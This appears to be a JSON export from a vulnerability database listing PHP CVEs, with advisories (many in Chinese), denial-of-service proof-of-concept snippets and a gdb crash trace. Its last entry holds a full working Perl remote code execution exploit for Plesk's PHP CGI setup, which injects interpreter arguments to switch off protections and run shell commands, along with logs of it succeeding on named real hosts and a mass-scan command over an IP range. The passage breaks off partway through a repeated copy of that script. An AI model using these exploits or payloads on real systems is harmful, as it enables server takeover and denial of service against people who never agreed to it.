            "sourceData": "\n                                                php &gt; imagecreatefromxpm(&quot;monochome-poc.xpm&quot;);\r\n\r\n(gdb) p colorTable[0]\r\n$2 = {string = 0x7fa6cec524c0 &quot;A&quot;, symbolic = 0x0, m_color = 0x0, g4_color = 0x0, g_color = 0x0, c_color = 0x7fa6cec58650 &quot;#FFFFFF&quot;}\r\n(gdb) p colorTable[1]\r\n$3 = {string = 0x7fa6cec58670 &quot;B&quot;, symbolic = 0x0, m_color = 0x0, g4_color = 0x0, g_color = 0x0, c_color = 0x7fa6cec58690 &quot;#CCCCCC&quot;}\r\n(gdb) p colorTable[2]\r\n$4 = {string = 0x7fa6cec586b0 &quot;C&quot;, symbolic = 0x0, m_color = 0x0, g4_color = 0x0, g_color = 0x0, c_color = 0x7fa6cec586d0 &quot;#999999&quot;}\r\n(gdb) p colorTable[3]\r\n$5 = {string = 0x7fa6cec586f0 &quot;D&quot;, symbolic = 0x0, m_color = 0x7fa6cec58710 &quot;#666666&quot;, g4_color = 0x0, g_color = 0x0, c_color = 0x0}\r\n(gdb) p colorTable[4]\r\n$6 = {string = 0x7fa6cec58730 &quot;E&quot;, symbolic = 0x0, m_color = 0x0, g4_color = 0x0, g_color = 0x0, c_color = 0x7fa6cec58750 &quot;#333333&quot;}\r\n(gdb) p colorTable[5]\r\n$7 = {string = 0x7fa6cec58770 &quot;F&quot;, symbolic = 0x0, m_color = 0x0, g4_color = 0x0, g_color = 0x0, c_color = 0x7fa6cec58790 &quot;#000000&quot;}\r\n(gdb) c\r\nContinuing.\r\n\r\nProgram received signal SIGSEGV, Segmentation fault.\r\n__strlen_sse2_pminub () at ../sysdeps/x86_64/multiarch/strlen-sse2-pminub.S:39\r\n39\t\tmovdqu\t(%rdi), %xmm1\r\n(gdb) bt\r\n#0  __strlen_sse2_pminub () at ../sysdeps/x86_64/multiarch/strlen-sse2-pminub.S:39\r\n#1  0x00007f009474942a in gdImageCreateFromXpm (filename=&lt;optimized out&gt;) at /usr/src/debug/php-5.4.17/ext/gd/libgd/gdxpm.c:42\r\n#2  0x00007f009473d2c2 in _php_image_create_from (ht=&lt;optimized out&gt;, return_value=0x7f00a169be98, image_type=6, tn=0x7f0094753c00 &quot;XPM&quot;, func_p=0x7f0094749340 &lt;gdImageCreateFromXpm&gt;, \r\n    ioctx_func_p=&lt;optimized out&gt;, return_value_used=&lt;optimized out&gt;, this_ptr=&lt;optimized out&gt;, return_value_ptr=&lt;optimized out&gt;) at /usr/src/debug/php-5.4.17/ext/gd/gd.c:2534\r\n#3  0x00007f00a19e5181 in zend_do_fcall_common_helper_SPEC (execute_data=0x7f00a1665060) at /usr/src/debug/php-5.4.17/Zend/zend_vm_execute.h:643\r\n#4  0x00007f00a199f017 in execute (op_array=0x7f00a169acf8) at /usr/src/debug/php-5.4.17/Zend/zend_vm_execute.h:410\r\n#5  0x00007f00a1932976 in zend_eval_stringl (str=str@entry=0x7f00a1699c88 &quot;imagecreatefromxpm(\\&quot;0day/zero-day2.xpm\\&quot;);\\n&quot;, str_len=str_len@entry=42, retval_ptr=retval_ptr@entry=0x0, \r\n    string_name=string_name@entry=0x7f00a1a0cbdf &quot;php shell code&quot;) at /usr/src/debug/php-5.4.17/Zend/zend_execute_API.c:1197\r\n#6  0x00007f00a181fcdf in readline_shell_run () at /usr/src/debug/php-5.4.17/ext/readline/readline_cli.c:664\r\n#7  0x00007f00a19e78c4 in do_cli (argc=2, argv=0x7ffff35fc268) at /usr/src/debug/php-5.4.17/sapi/cli/php_cli.c:986\r\n#8  0x00007f00a179ea9a in main (argc=2, argv=0x7ffff35fc268) at /usr/src/debug/php-5.4.17/sapi/cli/php_cli.c:1364\n                              ",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:61811"
        }
    ],
    "CVE-2011-1466": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 46967\r\nCVE ID: CVE-2011-1466\r\n\r\nPHP\u662f\u4e00\u79cd\u5728\u7535\u8111\u4e0a\u8fd0\u884c\u7684\u811a\u672c\u8bed\u8a00\uff0c\u4e3b\u8981\u7528\u9014\u662f\u5728\u4e8e\u5904\u7406\u52a8\u6001\u7f51\u9875\uff0c\u5305\u542b\u4e86\u547d\u4ee4\u884c\u8fd0\u884c\u63a5\u53e3\u6216\u8005\u4ea7\u751f\u56fe\u5f62\u7528\u6237\u754c\u9762\u7a0b\u5e8f\u3002\r\n\r\nPHP 5.3.6\u4e4b\u524d\u7248\u672c\u7684Calendar\u6269\u5c55\u4e2d\u7684SdnToJulian\u51fd\u6570\u5728\u5b9e\u73b0\u4e0a\u5b58\u5728\u6574\u6570\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u53ef\u4f7f\u653b\u51fb\u8005\u901a\u8fc7cal_from_jd\u51fd\u6570\u7684\u9996\u4e2a\u53c2\u6570\u9020\u6210\u62d2\u7edd\u670d\u52a1\n0\nPHP 5.3.x\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nPHP\r\n---\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\nhttp://www.php.net",
            "modified": "2012-02-16T00:00:00",
            "published": "2012-02-16T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-30125",
            "id": "SSV:30125",
            "title": "PHP Calendar Extension \u201cSdnToJulian()\u201d\u8fdc\u7a0b\u6574\u6570\u6ea2\u51fa\u6f0f\u6d1e",
            "type": "seebug",
            "sourceData": "",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:30125"
        }
    ],
    "CVE-2012-3365": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 54612\r\nCVE ID: CVE-2012-3365\r\n\r\nPHP \u662f\u4e00\u79cd HTML \u5185\u5d4c\u5f0f\u7684\u8bed\u8a00\uff0cPHP\u4e0e\u5fae\u8f6f\u7684ASP\u9887\u6709\u51e0\u5206\u76f8\u4f3c\uff0c\u90fd\u662f\u4e00\u79cd\u5728\u670d\u52a1\u5668\u7aef\u6267\u884c\u7684\u5d4c\u5165HTML\u6587\u6863\u7684\u811a\u672c\u8bed\u8a00\uff0c\u8bed\u8a00\u7684\u98ce\u683c\u6709\u7c7b\u4f3c\u4e8eC\u8bed\u8a00\uff0c\u73b0\u5728\u88ab\u5f88\u591a\u7684\u7f51\u7ad9\u7f16\u7a0b\u4eba\u5458\u5e7f\u6cdb\u7684\u8fd0\u7528\u3002\r\n\r\nPHP 5.3.15\u4e4b\u524d\u7248\u672c\u5728SQLite\u6269\u5c55\u4e2d\u5b58\u5728\u9519\u8bef\uff0c\u53ef\u88ab\u5229\u7528\u7ed5\u8fc7&quot;open_basedir&quot;\u529f\u80fd\u3002\n0\nPHP 5.3.x\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nPHP\r\n---\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\nhttp://www.php.net",
            "modified": "2012-07-24T00:00:00",
            "published": "2012-07-24T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-60290",
            "id": "SSV:60290",
            "type": "seebug",
            "title": "PHP 5.3.x 'open_basedir'\u5b89\u5168\u9650\u5236\u7ed5\u8fc7\u6f0f\u6d1e",
            "sourceData": "",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:PARTIAL/A:NONE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:60290"
        }
    ],
    "CVE-2011-1467": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 46968\r\nCVE ID: CVE-2011-1467\r\n\r\nPHP\u662f\u5e7f\u6cdb\u4f7f\u7528\u7684\u901a\u7528\u76ee\u7684\u811a\u672c\u8bed\u8a00\uff0c\u7279\u522b\u9002\u5408\u4e8eWeb\u5f00\u53d1\uff0c\u53ef\u5d4c\u5165\u5230HTML\u4e2d\u3002\r\n\r\nPHP &quot;Intl&quot;\u6269\u5c55&quot;NumberFormatter::setSymbol()&quot;\u51fd\u6570\u5728\u5b9e\u73b0\u4e0a\u5b58\u5728\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u5229\u7528\u6b64\u6f0f\u6d1e\u9020\u6210\u5e94\u7528\u7a0b\u5e8f\u5d29\u6e83\uff0c\u62d2\u7edd\u670d\u52a1\u548c\u4efb\u610f\u4ee3\u7801\u6267\u884c\u3002\n\nMandrakeSoft Corporate Server 4.0 x86_64\r\nMandrakeSoft Corporate Server 4.0\r\nPHP PHP 5.x\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nPHP\r\n---\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\nhttp://www.php.net",
            "modified": "2011-03-27T00:00:00",
            "published": "2011-03-27T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-20395",
            "id": "SSV:20395",
            "title": "PHP &quot;Intl&quot;\u6269\u5c55&quot;NumberFormatter::setSymbol()&quot;\u51fd\u6570\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e",
            "type": "seebug",
            "sourceData": "\n                                                numfmt_set_symbol(numfmt_create(&quot;en&quot;, NumberFormatter::PATTERN_DECIMAL), 2147483648, &quot;&quot;)\n                              ",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:20395"
        },
        {
            "bulletinFamily": "exploit",
            "description": "PHP 5.3.x 'Intl' Extension 'NumberFormatter::setSymbol()' Function Denial of Service Vulnerability. CVE-2011-1467. Dos exploit for php platform",
            "modified": "2011-03-10T00:00:00",
            "published": "2011-03-10T00:00:00",
            "id": "EDB-ID:35483",
            "href": "https://www.exploit-db.com/exploits/35483/",
            "type": "exploitdb",
            "title": "PHP 5.3.x - 'Intl' Extension 'NumberFormatter::setSymbol' Function Denial of Service Vulnerability",
            "sourceData": "source: http://www.securityfocus.com/bid/46968/info\r\n\r\nPHP is prone to a remote denial-of-service vulnerability that affects the 'Intl' extension.\r\n\r\nSuccessful attacks will cause the application to crash, creating a denial-of-service condition. Due to the nature of this issue, arbitrary code-execution may be possible; however, this has not been confirmed.\r\n\r\nPHP versions prior to 5.3.6 are vulnerable.\r\n\r\nnumfmt_set_symbol(numfmt_create(\"en\", NumberFormatter::PATTERN_DECIMAL), 2147483648, \"\") ",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:35483"
        }
    ],
    "CVE-2012-0789": [
        {
            "bulletinFamily": "exploit",
            "description": "PHP 5.3.8 Remote Denial Of Service Vulnerability. CVE-2012-0789. Dos exploit for php platform",
            "modified": "2011-12-18T00:00:00",
            "published": "2011-12-18T00:00:00",
            "id": "EDB-ID:36789",
            "href": "https://www.exploit-db.com/exploits/36789/",
            "type": "exploitdb",
            "title": "PHP 5.3.8 - Remote Denial Of Service Vulnerability",
            "sourceData": "source: http://www.securityfocus.com/bid/52043/info\r\n\r\nPHP is prone to a remote denial-of-service vulnerability.\r\n\r\nAn attacker can exploit this issue to exhaust available memory, denying access to legitimate users.\r\n\r\nPHP versions prior to 5.3.9 are vulnerable. \r\n\r\n<?php\r\nwhile (true)\r\n{\r\nstrtotime('Monday 00:00 Europe/Paris'); // Memory leak\r\n}\r\n?> ",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:36789"
        }
    ],
    "CVE-2011-1470": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 46969\r\nCVE ID: CVE-2011-1470\r\n\r\nPHP\u662f\u5e7f\u6cdb\u4f7f\u7528\u7684\u901a\u7528\u76ee\u7684\u811a\u672c\u8bed\u8a00\uff0c\u7279\u522b\u9002\u5408\u4e8eWeb\u5f00\u53d1\uff0c\u53ef\u5d4c\u5165\u5230HTML\u4e2d\u3002\r\n\r\nPHP &quot;Zip&quot;\u6269\u5c55&quot;stream_get_contents()&quot;\u51fd\u6570\u5728\u5b9e\u73b0\u4e0a\u5b58\u5728\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u5229\u7528\u6b64\u6f0f\u6d1e\u9020\u6210\u5e94\u7528\u7a0b\u5e8f\u5d29\u6e83\uff0c\u62d2\u7edd\u670d\u52a1\u548c\u4efb\u610f\u4ee3\u7801\u6267\u884c\u3002\n\nMandrakeSoft Corporate Server 4.0 x86_64\r\nMandrakeSoft Corporate Server 4.0\r\nPHP PHP 5.x\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nPHP\r\n---\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\nhttp://www.php.net",
            "modified": "2011-03-27T00:00:00",
            "published": "2011-03-27T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-20394",
            "id": "SSV:20394",
            "title": "PHP &quot;Zip&quot;\u6269\u5c55&quot;stream_get_contents()&quot;\u51fd\u6570\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e",
            "type": "seebug",
            "sourceData": "\n                                                &lt;?php\r\n\r\n$target_file = 'META-INF/MANIFEST.MF';\r\n\r\n$za = new ZipArchive();\r\nif ($za-&gt;open('test.jar') !== TRUE)\r\n{\r\n    return FALSE;\r\n}\r\n\r\nif ($za-&gt;statName($target_file) !== FALSE)\r\n{\r\n    $fd = $za-&gt;getStream($target_file);\r\n}\r\nelse\r\n{\r\n    $fd = FALSE;\r\n}\r\n$za-&gt;close();\r\n\r\nif (is_resource($fd))\r\n{\r\n    echo strlen(stream_get_contents($fd));\r\n}\r\n\r\n?&gt;\n                              ",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:20394"
        },
        {
            "bulletinFamily": "exploit",
            "description": "PHP 5.3.x 'Zip' Extension 'stream_get_contents()' Function Denial of Service Vulnerability. CVE-2011-1470. Dos exploit for php platform",
            "modified": "2011-03-10T00:00:00",
            "published": "2011-03-10T00:00:00",
            "id": "EDB-ID:35484",
            "href": "https://www.exploit-db.com/exploits/35484/",
            "type": "exploitdb",
            "title": "PHP 5.3.x - 'Zip' Extension 'stream_get_contents' Function Denial of Service Vulnerability",
            "sourceData": "source: http://www.securityfocus.com/bid/46969/info\r\n\r\nPHP is prone to a remote denial-of-service vulnerability that affects the 'Zip' extension.\r\n\r\nSuccessful attacks will cause the application to crash, creating a denial-of-service condition. Due to the nature of this issue, arbitrary code-execution may be possible; however, this has not been confirmed.\r\n\r\nVersions prior to PHP 5.3.6 are vulnerable. \r\n\r\n<?php\r\n\r\n$target_file = 'META-INF/MANIFEST.MF';\r\n\r\n$za = new ZipArchive();\r\nif ($za->open('test.jar') !== TRUE)\r\n{\r\n    return FALSE;\r\n}\r\n\r\nif ($za->statName($target_file) !== FALSE)\r\n{\r\n    $fd = $za->getStream($target_file);\r\n}\r\nelse\r\n{\r\n    $fd = FALSE;\r\n}\r\n$za->close();\r\n\r\nif (is_resource($fd))\r\n{\r\n    echo strlen(stream_get_contents($fd));\r\n}\r\n\r\n?>\r\n\r\n",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:35484"
        }
    ],
    "CVE-2006-7243": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 44951\r\nCVE ID: CVE-2006-7243\r\n\r\nPHP\u662f\u4e00\u79cdHTML\u5185\u5d4c\u5f0f\u7684\u8bed\u8a00\uff0cPHP\u4e0e\u5fae\u8f6f\u7684ASP\u9887\u6709\u51e0\u5206\u76f8\u4f3c\uff0c\u90fd\u662f\u4e00\u79cd\u5728\u670d\u52a1\u5668\u7aef\u6267\u884c\u7684\u5d4c\u5165HTML\u6587\u6863\u7684\u811a\u672c\u8bed\u8a00\uff0c\u8bed\u8a00\u7684\u98ce\u683c\u6709\u7c7b\u4f3c\u4e8eC\u8bed\u8a00\uff0c\u73b0\u5728\u88ab\u5f88\u591a\u7684\u7f51\u7ad9\u7f16\u7a0b\u4eba\u5458\u5e7f\u6cdb\u7684\u8fd0\u7528\u3002\r\n\r\nPHP 5.3.4\u4e4b\u524d\u7248\u672c\u8def\u5f84\u540d\u4e2d\u63a5\u53d7\\0\u5b57\u7b26\uff0c\u901a\u8fc7\u5728\u6b64\u5b57\u7b26\u540e\u653e\u7f6e\u5b89\u5168\u7684\u6587\u4ef6\u6269\u5c55\u540d\uff0c\u653b\u51fb\u8005\u53ef\u7ed5\u8fc7\u76ee\u6807\u8bbf\u95ee\u9650\u5236\u3002\r\n0\r\nPHP 5.3.x\r\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nPHP\r\n---\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\nhttp://www.php.net",
            "modified": "2012-04-12T00:00:00",
            "published": "2012-04-12T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-60051",
            "id": "SSV:60051",
            "type": "seebug",
            "title": "PHP\u7a7a\u5b57\u7b26\u5b89\u5168\u9650\u5236\u7ed5\u8fc7\u6f0f\u6d1e(CVE-2006-7243)",
            "sourceData": "",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:PARTIAL/A:NONE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:60051"
        }
    ],
    "CVE-2012-1823": [
        {
            "bulletinFamily": "exploit",
            "description": "No description provided by source.",
            "modified": "2014-07-01T00:00:00",
            "published": "2014-07-01T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-79637",
            "id": "SSV:79637",
            "title": "Plesk < 9.5.4 - Zeroday Remote Exploit",
            "type": "seebug",
            "sourceData": "\n                                                Plesk Apache zeroday / June 2013\r\ndiscovered & exploited by kingcope\r\n\r\n\r\nthis Plesk configuration setting makes it possible:\r\nscriptAlias /phppath/ &#34;/usr/bin/&#34;\r\nFurthermore this is not cve-2012-1823 because the php interpreter is called directly.\r\n(no php file is called)\r\n\r\nParallels Plesk Remote Exploit -- PHP Code Execution and therefore Command Execution\r\nAffected and tested: Plesk 9.5.4\r\n\t\t\t\t\t Plesk 9.3\r\n\t\t\t\t\t Plesk 9.2\r\n\t\t\t\t\t Plesk 9.0\r\n\t\t\t\t\t Plesk 8.6\r\nDiscovered & Exploited by Kingcope / June 2013\r\nAffected and tested OS: RedHat, CentOS, Fedora\r\nAffected and tested Platforms: Linux i386, Linux x86_64\r\nUntested OS: Windows (php.exe?)\r\nUnaffected: 11.0.9 due to compiled in protection of PHP version\r\nTraces in /var/log/httpd/access_log: 192.168.74.142 - - [19/Mar/2013:18:59:41 +0100] &#34;POST /%70%68%70%70%61%74%68/%70%68%70?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%\r\n6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%\r\n62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%\r\n3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%6E HTTP/1.1&#34; 200 203 &#34;-&#34; &#34;Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)&#34;\r\nShodanhq overview of Plesk on Linux:\r\nhttp://www.shodanhq.com/search?q=plesklin\r\n\r\nperl plesk-simple.pl &#60;ip address&#62;\r\n...\r\n...\r\n...\r\nOK\r\nLinux ip.unsecure.net 2.6.18-028stab101.1 #1 SMP Sun Jun 24\r\n 19:50:48 MSD 2012 i686 i686 i386 GNU/Linux\r\nuid=48(apache) gid=48(apache) groups=48(apache),2521(psaserv)\r\n---\r\n./pnscan -w&#34;GET /phppath/php HTTP/1.0\\r\\n\\r\\n&#34; -r &#34;500 Internal&#34; 76.12.54.163/16 80\r\nperl plesk-simple.pl 76.12.81.206\r\nHTTP/1.1 200 OK\r\nDate: Sat, 16 Mar 2013 13:39:35 GMT\r\nServer: Apache/2.2.3 (CentOS)\r\nConnection: close\r\nTransfer-Encoding: chunked\r\nContent-Type: text/html\r\n\r\n77\r\nLinux 114114.unsecureweb.com 2.6.18-308.24.1.el5 #1 SMP Tue Dec 4 17:43:34 E\r\nST 2012 x86_64 x86_64 x86_64 GNU/Linux\r\n\r\n3e\r\nuid=48(apache) gid=48(apache) groups=48(apache),2521(psaserv)\r\n\r\n0\r\n\r\nperl plesk-simple-ssl.pl &#60;ip&#62; (use HTTPS because HTTP gave an internal server error)\r\nHTTP/1.1 200 OK\r\nDate: Tue, 19 Mar 2013 15:29:28 GMT\r\nServer: Apache/2.0.54 (Fedora)\r\nConnection: close\r\nTransfer-Encoding: chunked\r\nContent-Type: text/html\r\n\r\n3\r\nOK\r\n\r\n60\r\nLinux www.ucdavis.edu 2.6.17-1.2142_FC4 #1 Tue Jul 11 22:41:14 EDT 2006 i686 i686 i386 GNU/Linux\r\n\r\n4c\r\nuid=48(apache) gid=48(apache) groups=48(apache),500(webadmin),2522(psaserv)\r\n\r\n0\r\n\r\n\r\n\r\nuse IO::Socket;\r\nuse URI::Escape;\r\n$sock = IO::Socket::INET-&#62;new(PeerAddr =&#62; $ARGV[0],\r\n                              PeerPort =&#62; 80,\r\n                              Proto    =&#62; &#39;tcp&#39;);\r\n$pwn = &#39;&#60;?php echo &#34;Content-Type:text/html\\r\\n\\r\\n&#34;;echo &#34;OK\\n&#34;;system(&#34;uname -a;id;&#34;); ?&#62;&#39;;\r\n$arguments = uri_escape(&#34;-d&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; . \r\n\t\t\t uri_escape(&#34;allow_url_include=on&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;-d&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;safe_mode=off&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;-d&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;suhosin.simulation=on&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;-d&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;disable_functions=\\&#34;\\&#34;&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;-d&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; . \r\n\t\t\t uri_escape(&#34;open_basedir=none&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;-d&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;auto_prepend_file=php://input&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;-n&#34;,&#34;\\0-\\377&#34;);\r\n$path = uri_escape(&#34;phppath&#34;,&#34;\\0-\\377&#34;) . &#34;/&#34; . uri_escape(&#34;php&#34;,&#34;\\0-\\377&#34;);\r\nprint $sock &#34;POST /$path?$arguments HTTP/1.1\\r\\n&#34;\r\n           .&#34;Host: $ARGV[0]\\r\\n&#34;\r\n           .&#34;Content-Type: application/x-www-form-urlencoded\\r\\n&#34;\r\n           .&#34;Content-Length: &#34;. length($pwn) .&#34;\\r\\n\\r\\n&#34; . $pwn;\r\nwhile(&#60;$sock&#62;) {\r\n        print;\r\n}\r\n\r\nuse IO::Socket::SSL;\r\nuse URI::Escape;\r\n$sock = IO::Socket::SSL-&#62;new(PeerAddr =&#62; $ARGV[0],\r\n                              PeerPort =&#62; 443,\r\n                              Proto    =&#62; &#39;tcp&#39;);\r\n$pwn = &#39;&#60;?php echo &#34;Content-Type:text/html\\r\\n\\r\\n&#34;;echo &#34;OK\\n&#34;;system(&#34;uname -a;id;&#34;); ?&#62;&#39;;\r\n$arguments = uri_escape(&#34;-d&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; . \r\n\t\t\t uri_escape(&#34;allow_url_include=on&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;-d&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;safe_mode=off&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;-d&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;suhosin.simulation=on&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;-d&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;disable_functions=\\&#34;\\&#34;&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;-d&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; . \r\n\t\t\t uri_escape(&#34;open_basedir=none&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;-d&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;auto_prepend_file=php://input&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;-n&#34;,&#34;\\0-\\377&#34;);\r\n$path = uri_escape(&#34;phppath&#34;,&#34;\\0-\\377&#34;) . &#34;/&#34; . uri_escape(&#34;php&#34;,&#34;\\0-\\377&#34;);\r\nprint $sock &#34;POST /$path?$arguments HTTP/1.1\\r\\n&#34;\r\n           .&#34;Host: $ARGV[0]\\r\\n&#34;\r\n           .&#34;Content-Type: application/x-www-form-urlencoded\\r\\n&#34;\r\n           .&#34;Content-Length: &#34;. length($pwn) .&#34;\\r\\n\\r\\n&#34; . $pwn;\r\nwhile(&#60;$sock&#62;) {\r\n        print;\r\n}\r\n#CentOS/Redhat Linux: yum install perl-IO-Socket-SSL.noarch\r\n\r\n###############################################################################################################\r\n\r\nplesk-simple-ssl.pl\r\n\r\n#plesk remote exploit by kingcope\r\n#all your base belongs to me :&#62;\r\nuse IO::Socket::SSL;\r\nuse URI::Escape;\r\n$sock = IO::Socket::SSL-&#62;new(PeerAddr =&#62; $ARGV[0],\r\n                              PeerPort =&#62; 443,\r\n                              Proto    =&#62; &#39;tcp&#39;);\r\n$pwn = &#39;&#60;?php echo &#34;Content-Type:text/html\\r\\n\\r\\n&#34;;echo &#34;OK\\n&#34;;system(&#34;uname -a;id;&#34;); ?&#62;&#39;;\r\n$arguments = uri_escape(&#34;-d&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; . \r\n\t\t\t uri_escape(&#34;allow_url_include=on&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;-d&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;safe_mode=off&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;-d&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;suhosin.simulation=on&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t uri_escape(&#34;-d&#34;,&#34;\\0-\\377&#34;). &#34;+&#34; .\r\n\t\t\t 